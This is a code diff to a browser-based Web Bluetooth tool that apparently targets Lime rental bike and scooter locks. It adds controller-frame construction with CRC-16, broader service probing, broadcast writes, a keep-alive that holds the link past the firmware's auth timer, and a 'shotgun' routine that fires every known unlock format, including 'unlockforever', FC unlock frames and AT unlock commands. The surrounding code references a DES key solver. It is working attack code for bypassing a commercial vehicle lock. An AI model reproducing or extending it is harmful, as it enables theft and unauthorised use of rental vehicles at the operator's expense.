@@ -121,6 +121,20 @@
         <select id="atype" class="mono"><option>ATH</option><option selected>CMD</option><option>QRY</option><option>DBG</option></select>
         <input id="adata" class="mono" value='{"lock":0}'>
       </div>
+      <div class="lbl">Controller frame (FC header + CRC-16)</div>
+      <div class="row">
+        <input id="fccmd" class="mono" value="1663" placeholder="cmd hex">
+        <input id="fcpay" class="mono" placeholder="payload hex, e.g. F1">
+        <button id="sendfc" disabled>Send FC</button>
+      </div>
+      <div class="lbl">Write target &amp; mode</div>
+      <div class="row">
+        <select id="writeSel" class="mono grow"></select>
+        <select id="writeMode" class="mono"><option value="auto">auto</option><option value="resp">response</option><option value="noresp">no-resp</option></select>
+      </div>
+      <label class="chk"><input type="checkbox" id="broadcast"> broadcast every command to all writable characteristics</label>
+      <label class="chk"><input type="checkbox" id="readkeep"> gentle keep-alive: read every 2 s (holds the link without spamming writes)</label>
+      <button id="shotgun" class="mt" style="width:100%" disabled>Shotgun test — fire every command format</button>
     </details>
   </section>
 
@@ -157,6 +171,12 @@ function parseHex(s){
 }
 const ascii = s => /^[\x20-\x7e]+$/.test(s);
 const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+/* CRC-16/XMODEM controller frames: 46 43 | cmd(2) | len(2) | payload | crc(2) */
+function crc16(buf){let c=0;for(const b of buf){c^=b<<8;for(let i=0;i<8;i++)c=(c&0x8000)?((c<<1)^0x1021)&0xFFFF:(c<<1)&0xFFFF;}return c;}
+function fcFrame(cmd,payload){payload=payload||[];const n=payload.length,f=new Uint8Array(8+n);f[0]=0x46;f[1]=0x43;f[2]=(cmd>>8)&0xFF;f[3]=cmd&0xFF;f[4]=(n>>8)&0xFF;f[5]=n&0xFF;f.set(payload,6);const c=crc16(f.subarray(0,6+n));f[6+n]=(c>>8)&0xFF;f[7+n]=c&0xFF;return f;}
+const hexNum = s => { const t=(s||'').replace(/[^0-9a-fA-F]/g,''); if(!t) return null; const v=parseInt(t,16); return isNaN(v)?null:v; };
+const normUuid = u => { u=(u||'').trim().toLowerCase(); if(/^[0-9a-f]{4}$/.test(u)) return '0000'+u+'-0000-1000-8000-00805f9b34fb'; if(/^[0-9a-f]{8}$/.test(u)) return u+'-0000-1000-8000-00805f9b34fb'; return u; };
 const store = {
   get(k,d){ try { const v = localStorage.getItem('lime.'+k); return v===null?d:v; } catch(e){ return d; } },
   set(k,v){ try { localStorage.setItem('lime.'+k, v); } catch(e){} }
@@ -183,6 +203,17 @@ function setDot(on){ $('#statusdot').classList.toggle('off', !on); }
   }
   const cores = navigator.hardwareConcurrency || 4;
   log('secure=' + secure + ' bluetooth=' + bt + ' ua=' + (ios ? 'iOS' : 'other') + ' cores=' + cores, 'sys');
+})();
+
+/* controller-frame self-test (proves CRC16 + framing before you fire anything) */
+(function(){
+  const t = [
+    [fcFrame(0x1114, []), '46 43 11 14 00 00 EA FB'],
+    [fcFrame(0x1663, [0xF1]), '46 43 16 63 00 01 F1 1F E7'],
+    [fcFrame(0x1101, [...enc.encode('LIMEBIKE')]), '46 43 11 01 00 08 4C 49 4D 45 42 49 4B 45 BE 8A']
+  ];
+  let p = 0; t.forEach(([g,w]) => { if (hex(g) === w) p++; });
+  log('frame self-test: ' + p + '/' + t.length + (p === t.length ? ' pass' : ' FAIL'), p === t.length ? 'ok' : 'err');
 })();
 
 /* ---- DES tables (shared by main + worker) ---- */
@@ -319,27 +350,51 @@ async function solveParallel(known, missing, target){
 }
 
 /* ---- BLE ---- */
-let dev=null, srv=null, writers=[], hb=null, target=null, lastRx=0, manualDrop=false, connectedAt=0;
+let dev=null, srv=null, writers=[], hb=null, target=null, lastRx=0, manualDrop=false, connectedAt=0, readable=null, readTimer=null;
 const LIME_SERVICES = [
+  '6e400001-b5a3-f393-e0a9-e50e24dcca9e', // Nordic UART
   '0000ffe0-0000-1000-8000-00805f9b34fb',
-  '6e400001-b5a3-f393-e0a9-e50e24dcca9e',
+  '0000ffe5-0000-1000-8000-00805f9b34fb',
+  '0000ffe9-0000-1000-8000-00805f9b34fb',
+  '0000fff0-0000-1000-8000-00805f9b34fb',
+  '0000ff00-0000-1000-8000-00805f9b34fb',
+  '49535343-fe7d-4ae5-8fa9-9fafd205e455', // ISSC/Microchip transparent UART
   '0000fee7-0000-1000-8000-00805f9b34fb',
+  '0000fee9-0000-1000-8000-00805f9b34fb',
+  '0000fe95-0000-1000-8000-00805f9b34fb',
   '0000180a-0000-1000-8000-00805f9b34fb',
   '0000180f-0000-1000-8000-00805f9b34fb'
 ];
-const extras = () => $('#extra').value.split(',').map(s=>s.trim().toLowerCase())
+const extras = () => ($('#extra').value||'').split(/[\s,]+/).map(normUuid)
   .filter(s=>/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(s));
+function selectedWriter(){ const sel=$('#writeSel'); if(!sel||sel.value==='') return null; return writers[+sel.value]||null; }
+async function writeOne(c, bytes, mode){
+  const canNR=c.properties.writeWithoutResponse, canR=c.properties.write;
+  const nr = mode==='noresp' ? canNR : mode==='resp' ? false : (canNR && !canR);
+  if (nr && canNR) return c.writeValueWithoutResponse(bytes);
+  if (canR) return c.writeValue(bytes);
+  if (canNR) return c.writeValueWithoutResponse(bytes);
+  throw new Error('characteristic not writable');
+}
 
 async function tx(bytes){
   if (!writers.length) throw new Error('no writable characteristic');
+  const mode = $('#writeMode') ? $('#writeMode').value : 'auto';
+  const txt = String.fromCharCode(...bytes);
+  const label = ascii(txt) ? txt : hex(bytes);
+  if ($('#broadcast') && $('#broadcast').checked){
+    let any=false, lastErr;
+    for (const c of writers){ try { await writeOne(c, bytes, mode); any=true; } catch(e){ lastErr=e; } }
+    if (!any) throw new Error('broadcast failed: ' + (lastErr?lastErr.message:'?'));
+    log('tx -> ' + label + '  [broadcast x' + writers.length + ']');
+    return true;
+  }
+  const chosen = selectedWriter();
+  const order = chosen ? [chosen, ...writers.filter(c=>c!==chosen)] : writers;
   let lastErr;
-  for (const c of writers){
-    try {
-      if (c.properties.writeWithoutResponse) await c.writeValueWithoutResponse(bytes);
-      else await c.writeValue(bytes);
-      log('tx -> ' + (ascii(String.fromCharCode(...bytes)) ? String.fromCharCode(...bytes) : hex(bytes)));
-      return true;
-    } catch(e){ lastErr = e; }
+  for (const c of order){
+    try { await writeOne(c, bytes, mode); log('tx -> ' + label); return true; }
+    catch(e){ lastErr = e; }
   }
   throw new Error('every write failed: ' + (lastErr ? lastErr.message : '?'));
 }
@@ -357,24 +412,48 @@ async function autoAuth(reason){
 }
 
 async function discover(){
-  writers = [];
+  writers = []; readable = null;
   const rows = [];
   const notifyChars = [];
   // Phase 1: find writable characteristics FAST, before the firmware's auth timer expires.
-  for (const s of await srv.getPrimaryServices()){
-    for (const c of await s.getCharacteristics()){
+  // Fall back to probing known service UUIDs one by one if the bulk dump is blocked.
+  let services = [];
+  try { services = await srv.getPrimaryServices(); } catch(e){ log('getPrimaryServices: ' + e.message, 'warn'); }
+  if (!services.length){
+    for (const u of [...new Set([...LIME_SERVICES, ...extras()])]){
+      try { services.push(await srv.getPrimaryService(u)); } catch(_){}
+    }
+  }
+  for (const s of services){
+    let chars = [];
+    try { chars = await s.getCharacteristics(); } catch(_){ rows.push(s.uuid + ' (no access)'); continue; }
+    for (const c of chars){
       const p = [];
       if (c.properties.write) p.push('write');
       if (c.properties.writeWithoutResponse) p.push('writeNR');
       if (c.properties.notify) p.push('notify');
+      if (c.properties.indicate) p.push('indicate');
       if (c.properties.read) p.push('read');
-      rows.push(c.uuid + ' [' + (p.join(',') || '-') + ']');
+      rows.push(c.uuid.slice(0,8) + ' [' + (p.join(',') || '-') + ']');
       if (c.properties.write || c.properties.writeWithoutResponse) writers.push(c);
-      if (c.properties.notify) notifyChars.push(c);
+      if (c.properties.notify || c.properties.indicate) notifyChars.push(c);
+      if (c.properties.read && !readable) readable = c;
     }
   }
   $('#chars').textContent = rows.join('\n') || 'nothing visible';
-  log('writable: ' + writers.length, writers.length ? 'ok' : 'err');
+  // populate the write-target picker
+  const sel = $('#writeSel');
+  if (sel){
+    sel.innerHTML = '';
+    writers.forEach((c,i)=>{
+      const o = document.createElement('option');
+      o.value = i;
+      o.textContent = c.uuid.slice(0,8) + ' (' + c.service.uuid.slice(0,8) + ')' + (c.properties.write ? ' W' : ' w/o');
+      sel.append(o);
+    });
+    if (writers.length) sel.value = '0';
+  }
+  log('writable: ' + writers.length + ', notify: ' + notifyChars.length, writers.length ? 'ok' : 'err');
   if (!writers.length) log('add service UUIDs under Advanced and reconnect', 'err');
   enableControls(writers.length > 0);
 
@@ -400,7 +479,7 @@ async function discover(){
 function enableControls(on){
   setDot(on);
   $('#auto').disabled = !on;
-  ['#sendraw','#sendat','#recover'].forEach(s=>$(s).disabled = !on);
+  ['#sendraw','#sendat','#recover','#sendfc','#shotgun'].forEach(s=>{ const el=$(s); if(el) el.disabled = !on; });
   document.querySelectorAll('[data-preset]').forEach(b=>b.disabled = !on);
   $('#disconnect').disabled = !dev;
 }
@@ -430,6 +509,7 @@ $('#connect').onclick = async () => {
 
 async function gone(){
   clearInterval(hb); hb=null;
+  clearInterval(readTimer); readTimer=null;
   const lasted = connectedAt ? Math.round((Date.now()-connectedAt)/1000) : 0;
   log('disconnected after ~' + lasted + 's', 'err');
   if (lasted <= 10 && !$('#apass').value.trim())
@@ -459,14 +539,25 @@ const P = {
   lock: enc.encode('lock'),
   beep: enc.encode('alarm'),
   forever: enc.encode('unlockforever'),
-  ctrlUnlock: u8([0x46,0x43,0x16,0x61,0x00,0x01,0xF1,0xF2,0x8F])
+  ctrlUnlock: u8([0x46,0x43,0x16,0x61,0x00,0x01,0xF1,0xF2,0x8F]),
+  fcHandshake: fcFrame(0x1101, [...enc.encode('LIMEBIKE')]),
+  fcUnlock:   fcFrame(0x1663, [0xF1]),
+  fcUnlockB:  fcFrame(0x1613, [0xF1]),
+  fcLock:     fcFrame(0x1663, [0xF0]),
+  fcPing:     fcFrame(0x1114, [])
 };
 
 $('#auto').onclick = async () => {
   log('--- auto unlock ---', 'sys');
   const before = lastRx;
-  const steps = [['ASCII unlock', P.unlock], ['controller frame', P.ctrlUnlock]];
   const pass = $('#apass').value.trim();
+  const steps = [
+    ['FC handshake', P.fcHandshake],
+    ['ASCII unlock', P.unlock],
+    ['FC unlock 1663', P.fcUnlock],
+    ['FC unlock 1613', P.fcUnlockB],
+    ['legacy ctrl frame', P.ctrlUnlock]
+  ];
   if (pass) steps.push(['AT unlock', enc.encode('AT+CMD,' + pass + ',' + Date.now() + ',1,{"lock":0}$')]);
   for (const [n, d] of steps){
     try { await tx(d); log(n + ' ok'); } catch(e){ log(n + ': ' + e.message, 'err'); }
@@ -502,6 +593,50 @@ $('#sendat').onclick = async () => {
   const f = 'AT+' + $('#atype').value + ',' + $('#apass').value.trim() + ',' + Date.now() + ',1,' + $('#adata').value + '$';
   log('AT: ' + f);
   try { await tx(enc.encode(f)); } catch(e){ log(e.message, 'err'); }
+};
+
+$('#sendfc').onclick = async () => {
+  const cmd = hexNum($('#fccmd').value);
+  if (cmd === null) return log('FC cmd must be hex, e.g. 1663', 'err');
+  let pay = [];
+  try { pay = [...parseHex($('#fcpay').value || '')]; } catch(e){ return log('bad FC payload hex', 'err'); }
+  const f = fcFrame(cmd, pay);
+  log('FC frame: ' + hex(f));
+  try { await tx(f); } catch(e){ log(e.message, 'err'); }
+};
+
+$('#shotgun').onclick = async () => {
+  log('--- shotgun: firing every command format ---', 'sys');
+  const before = lastRx;
+  const pass = $('#apass').value.trim();
+  const shots = [
+    ['ascii unlock', P.unlock],
+    ['ascii unlockforever', P.forever],
+    ['FC handshake LIMEBIKE', P.fcHandshake],
+    ['FC 1663 F1', P.fcUnlock],
+    ['FC 1613 F1', P.fcUnlockB],
+    ['FC 1114 ping', P.fcPing],
+    ['legacy ctrl frame', P.ctrlUnlock]
+  ];
+  if (pass){
+    shots.push(['AT CMD unlock', enc.encode('AT+CMD,' + pass + ',' + Date.now() + ',1,{"lock":0}$')]);
+    shots.push(['AT ATH unlock', enc.encode('AT+ATH,' + pass + ',' + Date.now() + ',1,{"lock":0}$')]);
+  }
+  for (const [n, d] of shots){
+    try { await tx(d); log('shot: ' + n + ' ok'); } catch(e){ log('shot ' + n + ': ' + e.message, 'err'); }
+    await sleep(450);
+  }
+  await sleep(400);
+  log(lastRx > before ? 'a format got a reply - find the rx line above and note which shot preceded it' : 'no replies to any format', lastRx > before ? 'ok' : 'warn');
+};
+
+$('#readkeep').onchange = e => {
+  clearInterval(readTimer); readTimer = null;
+  if (e.target.checked){
+    if (!readable) return log('no readable characteristic to ping', 'warn');
+    readTimer = setInterval(()=>readable.readValue().catch(()=>{}), 2000);
+    log('read keep-alive on (every 2 s)', 'ok');
+  } else log('read keep-alive off');
 };
 
 $('#recover').onclick = async () => {
